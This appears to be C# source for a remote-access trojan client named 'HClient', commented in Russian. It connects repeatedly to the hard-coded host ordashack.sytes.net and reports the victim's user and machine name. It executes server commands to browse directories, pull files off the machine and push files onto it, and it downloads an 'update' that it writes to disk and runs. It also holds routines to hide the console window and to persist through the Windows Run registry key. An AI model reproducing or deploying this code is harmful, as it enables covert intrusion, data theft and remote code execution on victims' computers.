using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace HClient
{
    class Program
    {
        static Socket mySocket; //инициализзируем сокет;
        static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
        const double VERSION = 0.7;
        static BinaryWriter writer = new BinaryWriter(ms);
        static BinaryReader reader = new BinaryReader(ms);//чтение из потока
        static string currentDir;//положение директории
        static Thread checkConnection;
        static bool connectionIsOn;

        static Dictionary<string, int> codeReq = new Dictionary<string, int>()//команда и код
        {
            {"dir", 1},          //список файлов
            {"cd", 2},           //смена директории
            {"introduce", 3},    //получение информации о клиенте
            {"upload", 4 },      //загрузка файла на компютер клиента
            {"load", 5 },        //скачивание файла с компьютера клиента
            {"test", 6 },        //скачивание файла с компьютера клиента
            {"check", 100},      //получение информации о версии библиотеки
        };


        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {            
            //CheckAutoRun();//проверка на запись в регистре
            var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);//функция скрытия окна

            Console.Title = "Client";
            connectionIsOn = false;
            currentDir = AppDomain.CurrentDomain.BaseDirectory;// сохраненная директория
            Connection();

            checkConnection = new Thread(() =>
            {
                while (true)//бесконечный цикл проверки состояния подключения
                {
                    if (mySocket.Poll(1, SelectMode.SelectRead) && mySocket.Available == 0)//если связь потеряна
                    {
                        Console.WriteLine("Связь с сервером потеряна");
                        Thread.Sleep(1000);
                        connectionIsOn = false;
                        Connection();//пробуем подключиться                        
                    }
                    Thread.Sleep(1000); // каждые 10 секунд
                }
            });
            checkConnection.Start();// запускаем поток проверки*/

        }

        private static void Connection()//функция подключения
        {
            Console.WriteLine("Подключение к серверу");
            mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет;
            while (!mySocket.Connected)//пока нет подключения
            {

                try
                {
                    mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
                    //mySocket.Connect("192.168.0.15", 8080);      //пробуем подключиться к серверу    
                    //mySocket.Connect(@"127.0.0.1", 8080);
                }
                catch
                {
                    Console.Write(".");
                }
            }
            connectionIsOn = true;
            Console.Clear();
            Console.WriteLine("Подключен.");
            Thread.Sleep(1000);
            Console.Clear();
            introduse();//представляемся
            Task.Run(() => { while (connectionIsOn) recivePocket(); });//запускаем цикл
        }


        static void sendPocket()//неиспользуемая функция
        {
            ms.Position = 0;
            writer.Write("ok");
            mySocket.Send(ms.GetBuffer());
        }

        private static void recivePocket()//функция обработки пакета запроса
        {
            ms.Position = 0;
            mySocket.Receive(ms.GetBuffer());
            string request = reader.ReadString();
            //--------------------------------------------
            if (request.Equals("update"))//если запрос на обнавление
            {
                Update();//обнавляем

            }
            else
            {
                Request(ref currentDir, request, ms, mySocket);

            }

        }

        private static void introduse()//при подключении передает информацию о себе
        {
            ms.Position = 0;
            writer.Write(Environment.UserName);
            writer.Write(Environment.MachineName);
            writer.Write(AppDomain.CurrentDomain.BaseDirectory);
            mySocket.Send(ms.GetBuffer());
        }

        private static void Update()//обнавление версии
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\update.tmp";
            using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
            {
                int leng = reader.ReadInt32();
                byte[] data = new byte[leng];


                data = reader.ReadBytes(leng);
                fs.Write(data, 0, data.Length);
                // считывает байт в память и переводит каретку на байт вперед
                ms.Position = 0;
                writer.Write("Загрузка завершена.");
                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\HUpdater.exe"); //замениел Environment.CurrentDirectory
                Environment.Exit(0);
            }
        }


        static public void Request(ref string currentDir, string req, MemoryStream ms, Socket socket)//передаем  ссылку на данные о клиенте, запрос, иссылку на стрим
        {
            BinaryWriter writer = new BinaryWriter(ms);
            BinaryReader reader = new BinaryReader(ms);//чтение из потока
            string[] reqOpt = strigSpliter(req);//обработка строки, массив содержит команду и ее опции
            int code;//сюда будет записан код команды
            codeReq.TryGetValue(reqOpt[0], out code);     //записываем код команды     


            switch (code)
            {
                case 1://получаем файлы в папке
                    ms.Position = 0;

                    List<string> dirList = new List<string>();//список файлов

                    DirectoryInfo dr = new DirectoryInfo(currentDir);//получаем файлы из рабочей директории
                    dirList.Add("   FILES");
                    foreach (FileInfo fi in dr.GetFiles())//получаем в список файлы
                    {
                        dirList.Add(fi.ToString());
                    }
                    dirList.Add("   DIRECTORIES");
                    foreach (DirectoryInfo fi in dr.GetDirectories())//получаем папки
                    {

                        dirList.Add(fi.ToString());
                    }
                    writer.Write(1);//код операции
                    writer.Write(dirList.Count);//записываем колличество данных
                    foreach (var fi in dirList)//записываем в врайтер список
                    {
                        writer.Write(fi);
                    }

                    break;
                case 2://переходим в директорию
                    ms.Position = 0;
                    if (Directory.Exists(reqOpt[1]))//проверяем существует ли дирректория
                    {
                        currentDir = reqOpt[1];//если да записываем ее в ссылочную переменную
                        writer.Write(2);//код операции
                        writer.Write(currentDir);//возвращаем директорию
                    }
                    else
                    {
                        writer.Write(13);//ошибка
                        writer.Write("Директория не существует.");
                    }

                    break;
                case 3://представляемся информацию если произошла ошибка
                    ms.Position = 0;
                    writer.Write(3);//код операции
                    writer.Write(Environment.UserName);
                    writer.Write(Environment.MachineName);
                    writer.Write(currentDir);
                    break;
                case 4://загрузка файла
                    ms.Position = 0;
                    writer.Write(4);//код операции
                    socket.Send(ms.GetBuffer());
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    int length = reader.ReadInt32();
                    if (length == -1)
                    {
                        return;
                    }
                    string name = reader.ReadString();
                    ms.Position = 0;
                    writer.Write("Загрузка начата.");//код операции
                    socket.Send(ms.GetBuffer());
                    reciveFile(ref socket, length, name);
                    ms.Position = 0;
                    writer.Write("Загрузка завершена.");
                    break;
                case 5: //скачивание файла 
                    string nameFile;
                    ms.Position = 0;
                    writer.Write(5);//код операции
                    socket.Send(ms.GetBuffer());
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    Console.WriteLine(reader.ReadInt32());
                    try
                    {
                        nameFile = reqOpt[1];
                        string pathF = currentDir + "\\" + nameFile; ;
                        if (!File.Exists(pathF))
                        {
                            ms.Position = 0;
                            writer.Write(-1);
                        }
                        else
                        {
                            sendFile(ref socket, pathF);
                            ms.Position = 0;
                            writer.Write("Done");
                        }

                    }
                    catch
                    {
                        ms.Position = 0;
                        writer.Write(-1);
                    }
                    
                    break;
                case 6: //test                 
                    ms.Position = 0;
                    writer.Write(6);//код операции
                    socket.Send(ms.GetBuffer());
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    Console.WriteLine(reader.ReadString());
                    ms.Position = 0;
                    writer.Write("Test's OVER");
                    socket.Send(ms.GetBuffer());
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    Console.WriteLine(reader.ReadString());
                    ms.Position = 0;
                    writer.Write("Test's OVER numb 2");                    
                    break;
                case 100: //возвращает информацию о версии                    
                    ms.Position = 0;
                    writer.Write(100);//код операции
                    writer.Write("Проверка. Версия " + VERSION);
                    break;
                default: //при неправильном запросе
                    ms.Position = 0;
                    writer.Write(13);
                    writer.Write("Команда не существует.");
                    break;
            }
            socket.Send(ms.GetBuffer());

        }

        private static void sendFile(ref Socket socket, string pathF)//скачивание файла с машины клиента
        {
            try
            {
                using (FileStream fs = new FileStream(pathF, FileMode.Open))
                {

                    byte[] data = new byte[fs.Length];//массив для файла
                    int lenghtfile = (int)fs.Length;//размер файла
                    fs.Read(data, 0, (int)fs.Length);//считываем фаил в массив                                                    
                    string nameF = pathF.Substring(pathF.LastIndexOf('\\') + 1);//имя файла
                    ms.Position = 0;
                    writer.Write(lenghtfile);//передаем размер файла
                    writer.Write(nameF);//передаем имя
                    socket.Send(ms.GetBuffer());//отсылаем                                                        
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    Console.WriteLine(reader.ReadInt32());
                    using (MemoryStream msF = new MemoryStream(new byte[lenghtfile], 0, lenghtfile, true, true))
                    {
                         BinaryWriter writerF = new BinaryWriter(msF);                       
                         msF.Position = 0;
                         writerF.Write(data);
                         socket.Send(msF.GetBuffer());

                         ms.Position = 0;
                         socket.Receive(ms.GetBuffer());//get ok 
                         Console.WriteLine(reader.ReadString());                         
                    }


                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private static void reciveFile(ref Socket socketF, int lenghFile, string nameFile)//загруска файла на машину клиента
        {
            using (MemoryStream msFile = new MemoryStream(new byte[lenghFile], 0, lenghFile, true, true))
            {
                BinaryReader readerFile = new BinaryReader(msFile);
                byte[] data = new byte[lenghFile];
                using (FileStream fs = new FileStream(currentDir + '\\' + nameFile, FileMode.Create))
                {
                    msFile.Position = 0;
                    socketF.Receive(msFile.GetBuffer());
                    data = readerFile.ReadBytes(lenghFile);
                    fs.Write(data, 0, data.Length);
                    // считывает байт в память и переводит каретку на байт вперед

                }
            }



        }

        private static string[] strigSpliter(string req)
        {
            string[] retStr = new string[1];
            if (req.Contains('>'))
            {
                return req.Split(new char[] { '>' }, StringSplitOptions.RemoveEmptyEntries);
            }
            else
            {
                retStr[0] = req;
                return retStr;
            }
        }

        private static void CheckAutoRun()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp.GetValue("HClientStart") == null)
            {
                rkApp.SetValue("HClientStart", Path.Combine(Directory.GetCurrentDirectory(), "HClient.exe"));
            }

        }

    }
}